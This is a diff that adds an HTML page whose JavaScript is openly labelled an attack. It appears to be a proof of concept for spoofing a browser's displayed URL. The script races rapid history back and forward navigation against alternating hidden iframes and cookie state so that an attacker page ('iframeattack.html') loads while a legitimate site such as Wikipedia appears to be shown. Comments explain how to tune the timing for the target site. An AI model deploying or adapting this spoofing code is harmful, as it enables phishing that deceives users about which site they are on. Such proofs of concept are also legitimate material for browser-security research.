@@ -1,0 +1,208 @@
+<html>
+
+<head>
+<title>title</title>
+</head>
+
+<body>
+
+
+<button onclick="setCookie('stopalternating','', 1);window.location.reload();">start attack</button>
+
+
+<script>
+
+
+/****** config *******/
+
+
+var backcounter=5;
+
+
+//number of forwards to do. Hoping to land on the spoofed page. 
+
+var fwdcounter=4;
+
+
+var iframesalternatetimeout=1000;
+
+
+//to be tuned, depending on the url to spoof and the speed of the computer and internet connection. The faster the targeted website loads, the smaller this variable must be.
+
+var fastbackstimeout=10;
+
+
+
+var fwdtimeout=500;
+
+
+/*******************/
+
+
+
+function setCookie(cname, cvalue, exdays) {
+    var d = new Date();
+    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+    var expires = "expires="+d.toUTCString();
+    document.cookie = cname + "=" + cvalue + "; " + expires;
+}
+
+
+
+
+function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0; i<ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1);
+        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+    }
+    return "";
+}
+
+
+function delete_cookie( name ) {
+  document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+}
+
+
+
+function isNumber(n)
+{
+   return n == parseFloat(n);
+}
+
+
+function isEven(n) 
+{
+   return isNumber(n) && (n % 2 == 0);
+}
+
+
+
+
+
+function fastbacks()
+{
+
+backcounter--;
+window.history.back();
+
+if(backcounter>0){
+ setTimeout(function() { fastbacks(); } ,fastbackstimeout)
+ }
+else { 
+setCookie('stopalternating','no', 1); 
+
+
+fwdxtimes();
+}
+
+
+}
+
+
+
+
+
+function fwdxtimes()
+{
+
+fwdcounter--;
+window.history.forward();
+
+if(fwdcounter>0){
+ setTimeout(function() { fwdxtimes(); } ,fwdtimeout)
+ }
+
+
+}
+
+
+
+
+
+function createpageschain()
+{
+
+var lastiframe=parseInt(getCookie('lastiframe')); 
+
+var nextiframe=lastiframe+1;  
+
+if(isEven(lastiframe)){
+
+document.getElementById('1').src='iframe2.html';
+
+setCookie('lastiframe',nextiframe, 1);
+
+}
+else{
+
+document.getElementById('1').src='iframe1.html';
+
+setCookie('lastiframe',nextiframe, 1);
+}
+
+
+
+if(lastiframe > 6){
+
+
+
+setCookie('changelocation','1', 1);
+
+window.history.back();
+
+
+return;
+}
+else
+{
+setTimeout(function() { createpageschain(); } ,iframesalternatetimeout);
+}   
+
+}
+
+
+
+
+
+</script>
+
+
+
+
+
+
+<button style="display:none;" id='src' onclick="var j=document.getElementById('1');j.src='iframeattack.html';setTimeout(function(){self.location='lastpage.html';}, 50);">change location</button>
+
+
+
+
+
+
+
+<iframe  id="1" src="http://www.wikipedia.org" style="width:100%;height:100%;display:none;"></iframe>
+
+
+
+<script>
+
+//init
+
+setCookie('lastiframe','0', 1);
+setCookie('changelocation','0', 1);
+
+var stopalternating=getCookie('stopalternating');
+
+if(stopalternating ==''){ createpageschain();}
+if(stopalternating =='ok'){ setTimeout(function() { fastbacks(); } ,fastbackstimeout)}
+
+
+</script>
+
+
+</body>
+
+</html>
